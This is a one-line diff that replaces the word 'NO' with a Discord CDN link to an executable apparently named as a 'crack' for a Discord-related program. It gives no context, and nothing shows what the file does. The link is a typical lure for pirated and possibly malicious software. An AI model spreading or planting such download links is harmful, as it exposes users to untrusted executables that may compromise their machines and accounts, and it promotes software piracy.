@@ -1,1 +1,1 @@
-NO
+https://cdn.discordapp.com/attachments/1126735139351834685/1330817238801842266/MicDiscordCrack.exe?ex=678f5ba3&is=678e0a23&hm=442a93bf0e008ed5a1ac23c5076e5ecc5e436a026d383f6bd0dc0dbdf6208d39&
